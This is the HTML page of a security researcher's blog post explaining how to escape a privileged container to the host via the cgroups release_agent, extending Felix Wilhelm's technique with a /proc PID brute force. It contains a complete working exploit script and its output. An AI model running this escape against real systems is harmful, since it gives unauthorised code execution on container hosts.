@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Privileged Container Escape - Control Groups release_agent | Alex Chapman’s Blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="Privileged Container Escape - Control Groups release_agent" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="I’ve recently been doing a lot of bug hunting in containerized environments, and one common theme has been escaping a container to execute code on the container host. In this post I’ll expand on a technique reported by Felix Wilhelm (@_fel1x) to escape a privileged container to execute arbitrary commands on the container host." />
+<meta property="og:description" content="I’ve recently been doing a lot of bug hunting in containerized environments, and one common theme has been escaping a container to execute code on the container host. In this post I’ll expand on a technique reported by Felix Wilhelm (@_fel1x) to escape a privileged container to execute arbitrary commands on the container host." />
+<link rel="canonical" href="https://blog.ajxchapman.com/posts/2020/11/19/privileged-container-escape.html" />
+<meta property="og:url" content="https://blog.ajxchapman.com/posts/2020/11/19/privileged-container-escape.html" />
+<meta property="og:site_name" content="Alex Chapman’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-11-19T00:00:00-06:00" />
+<script type="application/ld+json">
+{"headline":"Privileged Container Escape - Control Groups release_agent","dateModified":"2020-11-19T00:00:00-06:00","datePublished":"2020-11-19T00:00:00-06:00","@type":"BlogPosting","description":"I’ve recently been doing a lot of bug hunting in containerized environments, and one common theme has been escaping a container to execute code on the container host. In this post I’ll expand on a technique reported by Felix Wilhelm (@_fel1x) to escape a privileged container to execute arbitrary commands on the container host.","url":"https://blog.ajxchapman.com/posts/2020/11/19/privileged-container-escape.html","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.ajxchapman.com/posts/2020/11/19/privileged-container-escape.html"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+  </head>
+  <body>
+
+      <header class="page-header" role="banner">
+        <a href="/">
+          <h1 class="project-name">Alex Chapman's Blog</h1>
+        </a>
+        <h2 class="project-tagline">A tech blog about all things Bug Bounty, security and development.
+</h2>
+        <div class="social">
+          <a href="https://twitter.com/ajxchapman" target="_blank"><img src="/assets/icons/twitter.svg"></a>
+          <a href="https://infosec.exchange/@ajxchapman" rel="me" target="_blank"><img src="/assets/icons/mastodon.svg"></a>
+          <a href="https://github.com/ajxchapman" target="_blank"><img src="/assets/icons/github.svg"></a>
+          <a href="https://hackerone.com/ajxchapman" target="_blank"><img src="/assets/icons/hackerone.svg"></a>
+          <a href="https://bugcrowd.com/ajxchapman" target="_blank"><img src="/assets/icons/bugcrowd.svg"></a>
+        </div>
+      </header>
+
+    <main id="content" class="main-content" role="main">
+      
+
+
+  
+
+  
+
+  
+
+  
+    
+    
+    
+
+
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="postheader">
+    <a href="/">Home</a>
+  </div>
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Privileged Container Escape - Control Groups release_agent</h1>
+    <p class="post-meta">
+      <time datetime="2020-11-19T00:00:00-06:00" itemprop="datePublished">
+        2020-11-19
+      </time>
+      
+        • <span itemprop="category">Containers</span>
+      
+  </header>
+  <div class="post-content" itemprop="articleBody">
+    <p>I’ve recently been doing a lot of bug hunting in containerized environments, and one common theme has been escaping a container to execute code on the container host. In this post I’ll expand on a technique reported by <a href="https://twitter.com/_fel1x">Felix Wilhelm (@_fel1x)</a> to escape a privileged container to execute arbitrary commands on the container host.</p>
+
+<!--more-->
+
+<style>
+/* Code block styling */
+.shell_output {
+  position: relative;
+}
+
+.shell_output > figure {
+  margin: 0px;
+}
+
+.shell_output .header {
+  border: 1px solid rgb(220, 230, 240);
+  border-radius: 2px;
+  position: absolute;
+  right: 0px;
+  padding-left: 4px;
+  padding-right: 4px;
+  font-size: 0.8em;
+  font-weight: bold;
+}
+
+.shell_output.container .header {
+  background-color: #f9fff5;
+}
+
+.shell_output.host .header {
+  background-color: #fff5f5;
+}
+
+.shell_output .highlight > pre {
+  padding-top: 1.5em;
+}
+</style>
+
+<p>Privileged containers are often used in CI/CD pipelines to allow for building and publishing Docker images. Compromising a privileged container gets you one step closer to accessing the container host, but often will not let you easily execute commands directly on the host.</p>
+
+<p>In July 2019 howerver, Felix Wilhelm posted a Tweet with a Proof of Concept to escape a privileged container by abusing the Control Groups <code class="highlighter-rouge">release_agent</code> functionality to execute arbitrary commands on the container host:</p>
+
+<blockquote class="twitter-tweet tw-align-center" data-dnt="true"><p lang="en" dir="ltr">Quick and dirty way to get out of a privileged k8s pod or docker container by using cgroups release_agent feature. <a href="https://t.co/q8BI8ASBO8">pic.twitter.com/q8BI8ASBO8</a></p>&mdash; Felix Wilhelm (@_fel1x) <a href="https://twitter.com/_fel1x/status/1151487053370187776?ref_src=twsrc%5Etfw">July 17, 2019</a></blockquote>
+<script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<p>Trail of Bits have done good job of explaining the details of this PoC at <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</a>, they also detail the precise capabilities required for a container to execute this attack. A simple explanation is that the cgroups <code class="highlighter-rouge">release_agent</code> functionality can be triggered from a privileged container to execute a path on the host file system, specified by the contents of the <code class="highlighter-rouge">release_agent</code> file. The key is that the path specified in the <code class="highlighter-rouge">release_agent</code> file has to be relative to the root file system of the container host, <em>not</em> a container.</p>
+
+<p>Felix’s PoC identifies the host path of files within a container by parsing the container root mount point, and extracting the <code class="highlighter-rouge">upperdir</code> mount option. To demonstrate this we can spin up a privileged Docker container and extract the host file system path of a file within the container:</p>
+
+<div class="shell_output host">
+<div class="header">Host</div>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">root@host:~<span class="nv">$ </span>docker run <span class="nt">-ti</span> <span class="nt">--privileged</span> <span class="nt">--rm</span> alpine:latest /bin/sh</code></pre></figure>
+
+</div>
+
+<p>Then within the container:</p>
+
+<div class="shell_output container">
+<div class="header">Container</div>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">root@container:~<span class="nv">$ </span><span class="nb">head</span> <span class="nt">-1</span> /etc/mtab
+overlay / overlay rw,relatime,lowerdir<span class="o">=</span>/var/lib/docker/overlay2/l/SZLBR2DCKKDKNQSS2TN5EBJQCO:/var/lib/docker/overlay2/l/Z45AX7CJLMJSBBQ7LXU3VXVZGB,upperdir<span class="o">=</span>/var/lib/docker/overlay2/826cfa3f5296e4643bab26e7d8e13885fff67636a403ffd9811486352c50e053/diff,workdir<span class="o">=</span>/var/lib/docker/overlay2/826cfa3f5296e4643bab26e7d8e13885fff67636a403ffd9811486352c50e053/work,xino<span class="o">=</span>off 0 0
+root@container:~<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'s/.*\perdir=\([^,]*\).*/\1/p'</span> /etc/mtab
+/var/lib/docker/overlay2/826cfa3f5296e4643bab26e7d8e13885fff67636a403ffd9811486352c50e053/diff</code></pre></figure>
+
+</div>
+
+<p>In this instance the container is configured to use <code class="highlighter-rouge">overlayfs</code>, which exposes the host file system path of container mounts to the container itself. The host file system path here would be <code class="highlighter-rouge">/var/lib/docker/overlay2/826cfa3f5296e4643bab26e7d8e13885fff67636a403ffd9811486352c50e053/diff</code></p>
+
+<p>This can be confirmed by creating a file within a container:</p>
+
+<div class="shell_output container">
+<div class="header">Container</div>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">root@container:~<span class="nv">$ </span><span class="nb">echo </span>findme <span class="o">&gt;</span> /findme
+root@container:~<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'s/.*\perdir=\([^,]*\).*/\1\/findme/p'</span> /etc/mtab
+/var/lib/docker/overlay2/826cfa3f5296e4643bab26e7d8e13885fff67636a403ffd9811486352c50e053/diff/findme</code></pre></figure>
+
+</div>
+
+<p>And in another shell on the container host, using the <code class="highlighter-rouge">overlayfs</code> mount path to <code class="highlighter-rouge">cat</code> the file:</p>
+<div class="shell_output host">
+<div class="header">Host</div>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">root@host:~<span class="nv">$ </span><span class="nb">cat</span> /var/lib/docker/overlay2/826cfa3f5296e4643bab26e7d8e13885fff67636a403ffd9811486352c50e053/diff/findme
+findme</code></pre></figure>
+
+</div>
+
+<h2 id="edge-cases">Edge cases</h2>
+
+<p>This works fine when the container is configured with a storage-driver which exposes the full host path of the mount point, for example <code class="highlighter-rouge">overlayfs</code>, however I recently came across a couple of configurations which did not obviously disclose the host file system mount point.</p>
+
+<h3 id="kata-containers">Kata Containers*</h3>
+
+<div class="shell_output container">
+<div class="header">Container</div>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">root@container:~<span class="nv">$ </span><span class="nb">head</span> <span class="nt">-1</span> /etc/mtab
+kataShared on / <span class="nb">type </span>9p <span class="o">(</span>rw,dirsync,nodev,relatime,mmap,access<span class="o">=</span>client,trans<span class="o">=</span>virtio<span class="o">)</span></code></pre></figure>
+
+</div>
+
+<p><a href="https://katacontainers.io/">Kata Containers</a> by default mounts the root fs of a container over <code class="highlighter-rouge">9pfs</code>. This discloses no information about the location of the container file system in the Kata Containers Virtual Machine.</p>
+
+<p>* More on Kata Containers in a future blog post.</p>
+
+<h3 id="device-mapper">Device Mapper</h3>
+
+<div class="shell_output container">
+<div class="header">Container</div>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">root@container:~<span class="nv">$ </span><span class="nb">head</span> <span class="nt">-1</span> /etc/mtab
+/dev/sdc / ext4 rw,relatime,stripe<span class="o">=</span>384 0 0</code></pre></figure>
+
+</div>
+
+<p>I saw a container with this root mount in a live environment, I believe the container was running with a specific <code class="highlighter-rouge">devicemapper</code> storage-driver configuration, but at this point I have been unable to replicate this behaviour in a test environment.</p>
+
+<h2 id="an-alternative-poc">An Alternative PoC</h2>
+
+<p>Obviously in these cases there is not enough information to identify the path of container files on the host file system, so Felix’s PoC cannot be used as is. However, we can still execute this attack with a little ingenuity.</p>
+
+<p>The one key piece of information required is the full path, relative to the container host, of a file to execute within the container. Without being able to discern this from mount points within the container we have to look elsewhere.</p>
+
+<h3 id="proc-to-the-rescue">Proc to the Rescue</h3>
+
+<p>The Linux <code class="highlighter-rouge">/proc</code> pseudo-filesystem exposes kernel process data structures for all processes running on a system, including those running in different namespaces, for example within a container. This can be shown by running a command in a container and accessing the <code class="highlighter-rouge">/proc</code> directory of the process on the host:</p>
+
+<div class="shell_output container">
+<div class="header">Container</div>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">root@container:~<span class="nv">$ </span><span class="nb">sleep </span>100</code></pre></figure>
+
+</div>
+
+<div class="shell_output host">
+<div class="header">Host</div>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">root@host:~<span class="nv">$ </span>ps <span class="nt">-eaf</span> | <span class="nb">grep sleep
+</span>root     28936 28909  0 10:11 pts/0    00:00:00 <span class="nb">sleep </span>100
+root@host:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /proc/<span class="sb">`</span>pidof <span class="nb">sleep</span><span class="sb">`</span>
+total 0
+dr-xr-xr-x   9 root root 0 Nov 19 10:03 <span class="nb">.</span>
+dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
+dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
+<span class="nt">-rw-r--r--</span>   1 root root 0 Nov 19 10:04 autogroup
+<span class="nt">-r--------</span>   1 root root 0 Nov 19 10:04 auxv
+<span class="nt">-r--r--r--</span>   1 root root 0 Nov 19 10:03 cgroup
+<span class="nt">--w-------</span>   1 root root 0 Nov 19 10:04 clear_refs
+<span class="nt">-r--r--r--</span>   1 root root 0 Nov 19 10:04 cmdline
+...
+<span class="nt">-rw-r--r--</span>   1 root root 0 Nov 19 10:29 projid_map
+lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -&gt; /
+<span class="nt">-rw-r--r--</span>   1 root root 0 Nov 19 10:29 sched
+...</code></pre></figure>
+
+</div>
+
+<p><em>As an aside, the <code class="highlighter-rouge">/proc/&lt;pid&gt;/root</code> data structure is one that confused me for a very long time, I could never understand why having a symbolic link to <code class="highlighter-rouge">/</code> was useful, until I read the actual definition in the man pages:</em></p>
+<blockquote>
+  <p>/proc/[pid]/root</p>
+
+  <p>UNIX  and  Linux  support the idea of a per-process root of the filesystem, set by the chroot(2) system call.  This file is a symbolic link that points to the process’s root directory, and behaves in the same way as exe, and fd/*.</p>
+
+  <p>Note however that this file is not merely a symbolic link.  It provides the same view of the filesystem (including namespaces and the set  of  per-process mounts)  as the process itself.</p>
+</blockquote>
+
+<p>The <code class="highlighter-rouge">/proc/&lt;pid&gt;/root</code> symbolic link can be used as a host relative path to any file within a container:</p>
+
+<div class="shell_output container">
+<div class="header">Container</div>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">root@container:~<span class="nv">$ </span><span class="nb">echo </span>findme <span class="o">&gt;</span> /findme
+root@container:~<span class="nv">$ </span><span class="nb">sleep </span>100</code></pre></figure>
+
+</div>
+
+<div class="shell_output host">
+<div class="header">Host</div>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">root@host:~<span class="nv">$ </span><span class="nb">cat</span> /proc/<span class="sb">`</span>pidof <span class="nb">sleep</span><span class="sb">`</span>/root/findme
+findme</code></pre></figure>
+
+</div>
+
+<p>This changes the requirement for the attack from knowing the full path, relative to the container host, of a file within the container, to knowing the pid of <em>any</em> process running in the container.</p>
+
+<h3 id="pid-bashing">Pid Bashing</h3>
+
+<p>This is actually the easy part, process ids in Linux are numerical and assigned sequentially. The <code class="highlighter-rouge">init</code> process is assigned process id <code class="highlighter-rouge">1</code> and all subsequent processes are assigned incremental ids. To identify the host process id of a process within a container, a brute force incremental search can be used:</p>
+
+<div class="shell_output container">
+<div class="header">Container</div>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">root@container:~<span class="nv">$ </span><span class="nb">echo </span>findme <span class="o">&gt;</span> /findme
+root@container:~<span class="nv">$ </span><span class="nb">sleep </span>100</code></pre></figure>
+
+</div>
+
+<div class="shell_output host">
+<div class="header">Host</div>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">root@host:~<span class="nv">$ COUNTER</span><span class="o">=</span>1
+root@host:~<span class="nv">$ </span><span class="k">while</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> /proc/<span class="k">${</span><span class="nv">COUNTER</span><span class="k">}</span>/root/findme <span class="o">]</span><span class="p">;</span> <span class="k">do </span><span class="nv">COUNTER</span><span class="o">=</span><span class="k">$((${</span><span class="nv">COUNTER</span><span class="k">}</span> <span class="o">+</span> <span class="m">1</span><span class="k">))</span><span class="p">;</span> <span class="k">done
+</span>root@host:~<span class="nv">$ </span><span class="nb">echo</span> <span class="k">${</span><span class="nv">COUNTER</span><span class="k">}</span>
+7822
+root@host:~<span class="nv">$ </span><span class="nb">cat</span> /proc/<span class="k">${</span><span class="nv">COUNTER</span><span class="k">}</span>/root/findme
+findme</code></pre></figure>
+
+</div>
+
+<h3 id="putting-it-all-together">Putting it All Together</h3>
+
+<p>To complete this attack the brute force technique can be used to guess the pid for the path <code class="highlighter-rouge">/proc/&lt;pid&gt;/root/payload.sh</code>, with each iteration writing the guessed pid path to the cgroups <code class="highlighter-rouge">release_agent</code> file, triggering the <code class="highlighter-rouge">release_agent</code>, and seeing if an output file is created.</p>
+
+<p>The only caveat with this technique is it is in no way shape or form subtle, and can increase the pid count very high. As no long running processes are kept running this <em>should</em> not cause reliability issues, but don’t quote me on that.</p>
+
+<p>The below PoC implements these techniques to provide a more generic attack than first presented in Felix’s original PoC for escaping a privileged container using the cgroups <code class="highlighter-rouge">release_agent</code>  functionality:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+
+<span class="nv">OUTPUT_DIR</span><span class="o">=</span><span class="s2">"/"</span>
+<span class="nv">MAX_PID</span><span class="o">=</span>65535
+<span class="nv">CGROUP_NAME</span><span class="o">=</span><span class="s2">"xyx"</span>
+<span class="nv">CGROUP_MOUNT</span><span class="o">=</span><span class="s2">"/tmp/cgrp"</span>
+<span class="nv">PAYLOAD_NAME</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">CGROUP_NAME</span><span class="k">}</span><span class="s2">_payload.sh"</span>
+<span class="nv">PAYLOAD_PATH</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">OUTPUT_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">PAYLOAD_NAME</span><span class="k">}</span><span class="s2">"</span>
+<span class="nv">OUTPUT_NAME</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">CGROUP_NAME</span><span class="k">}</span><span class="s2">_payload.out"</span>
+<span class="nv">OUTPUT_PATH</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">OUTPUT_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">OUTPUT_NAME</span><span class="k">}</span><span class="s2">"</span>
+
+<span class="c"># Run a process for which we can search for (not needed in reality, but nice to have)</span>
+<span class="nb">sleep </span>10000 &amp;
+
+<span class="c"># Prepare the payload script to execute on the host</span>
+<span class="nb">cat</span> <span class="o">&gt;</span> <span class="k">${</span><span class="nv">PAYLOAD_PATH</span><span class="k">}</span> <span class="o">&lt;&lt;</span> <span class="no">__EOF__</span><span class="sh">
+#!/bin/sh
+
+OUTPATH=</span><span class="se">\$</span><span class="sh">(dirname </span><span class="se">\$</span><span class="sh">0)/</span><span class="k">${</span><span class="nv">OUTPUT_NAME</span><span class="k">}</span><span class="sh">
+
+# Commands to run on the host&lt;
+ps -eaf &gt; </span><span class="se">\$</span><span class="sh">{OUTPATH} 2&gt;&amp;1
+</span><span class="no">__EOF__
+
+</span><span class="c"># Make the payload script executable</span>
+<span class="nb">chmod </span>a+x <span class="k">${</span><span class="nv">PAYLOAD_PATH</span><span class="k">}</span>
+
+<span class="c"># Set up the cgroup mount using the memory resource cgroup controller</span>
+<span class="nb">mkdir</span> <span class="k">${</span><span class="nv">CGROUP_MOUNT</span><span class="k">}</span>
+mount <span class="nt">-t</span> cgroup <span class="nt">-o</span> memory cgroup <span class="k">${</span><span class="nv">CGROUP_MOUNT</span><span class="k">}</span>
+<span class="nb">mkdir</span> <span class="k">${</span><span class="nv">CGROUP_MOUNT</span><span class="k">}</span>/<span class="k">${</span><span class="nv">CGROUP_NAME</span><span class="k">}</span>
+<span class="nb">echo </span>1 <span class="o">&gt;</span> <span class="k">${</span><span class="nv">CGROUP_MOUNT</span><span class="k">}</span>/<span class="k">${</span><span class="nv">CGROUP_NAME</span><span class="k">}</span>/notify_on_release
+
+<span class="c"># Brute force the host pid until the output path is created, or we run out of guesses</span>
+<span class="nv">TPID</span><span class="o">=</span>1
+<span class="k">while</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="k">${</span><span class="nv">OUTPUT_PATH</span><span class="k">}</span> <span class="o">]</span>
+<span class="k">do
+  if</span> <span class="o">[</span> <span class="k">$((${</span><span class="nv">TPID</span><span class="k">}</span> <span class="o">%</span> <span class="m">100</span><span class="k">))</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+  <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"Checking pid </span><span class="k">${</span><span class="nv">TPID</span><span class="k">}</span><span class="s2">"</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="k">${</span><span class="nv">TPID</span><span class="k">}</span> <span class="nt">-gt</span> <span class="k">${</span><span class="nv">MAX_PID</span><span class="k">}</span> <span class="o">]</span>
+    <span class="k">then
+      </span><span class="nb">echo</span> <span class="s2">"Exiting at </span><span class="k">${</span><span class="nv">MAX_PID</span><span class="k">}</span><span class="s2"> :-("</span>
+      <span class="nb">exit </span>1
+    <span class="k">fi
+  fi</span>
+  <span class="c"># Set the release_agent path to the guessed pid</span>
+  <span class="nb">echo</span> <span class="s2">"/proc/</span><span class="k">${</span><span class="nv">TPID</span><span class="k">}</span><span class="s2">/root</span><span class="k">${</span><span class="nv">PAYLOAD_PATH</span><span class="k">}</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="k">${</span><span class="nv">CGROUP_MOUNT</span><span class="k">}</span>/release_agent
+  <span class="c"># Trigger execution of the release_agent</span>
+  sh <span class="nt">-c</span> <span class="s2">"echo </span><span class="se">\$\$</span><span class="s2"> &gt; </span><span class="k">${</span><span class="nv">CGROUP_MOUNT</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">CGROUP_NAME</span><span class="k">}</span><span class="s2">/cgroup.procs"</span>
+  <span class="nv">TPID</span><span class="o">=</span><span class="k">$((${</span><span class="nv">TPID</span><span class="k">}</span> <span class="o">+</span> <span class="m">1</span><span class="k">))</span>
+<span class="k">done</span>
+
+<span class="c"># Wait for and cat the output</span>
+<span class="nb">sleep </span>1
+<span class="nb">echo</span> <span class="s2">"Done! Output:"</span>
+<span class="nb">cat</span> <span class="k">${</span><span class="nv">OUTPUT_PATH</span><span class="k">}</span>
+</code></pre></div></div>
+
+<p>Executing the PoC within a privileged container should provide output similar to:</p>
+<div class="shell_output container">
+<div class="header">Container</div>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">root@container:~<span class="nv">$ </span>./release_agent_pid_brute.sh
+Checking pid 100
+Checking pid 200
+Checking pid 300
+Checking pid 400
+Checking pid 500
+Checking pid 600
+Checking pid 700
+Checking pid 800
+Checking pid 900
+Checking pid 1000
+Checking pid 1100
+Checking pid 1200
+
+Done! Output:
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 11:25 ?        00:00:01 /sbin/init
+root         2     0  0 11:25 ?        00:00:00 <span class="o">[</span>kthreadd]
+root         3     2  0 11:25 ?        00:00:00 <span class="o">[</span>rcu_gp]
+root         4     2  0 11:25 ?        00:00:00 <span class="o">[</span>rcu_par_gp]
+root         5     2  0 11:25 ?        00:00:00 <span class="o">[</span>kworker/0:0-events]
+root         6     2  0 11:25 ?        00:00:00 <span class="o">[</span>kworker/0:0H-kblockd]
+root         9     2  0 11:25 ?        00:00:00 <span class="o">[</span>mm_percpu_wq]
+root        10     2  0 11:25 ?        00:00:00 <span class="o">[</span>ksoftirqd/0]
+...</code></pre></figure>
+
+</div>
+
+<h2 id="closing-thoughts">Closing Thoughts</h2>
+
+<p>Thanks to <a href="https://twitter.com/_fel1x">Felix Wilhelm</a> for publishing the initial PoC for this powerful privileged container escape technique.</p>
+
+<p>For further details on the workings of cgroups <code class="highlighter-rouge">release_agent</code> see <a href="https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt">https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt</a>.</p>
+
+  </div>
+
+  <div class="postfooter">
+    <a href="/">Home</a>
+    
+      <a href="/containers/index.html">More Containers posts</a>
+    
+  </div>
+</article>
+
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
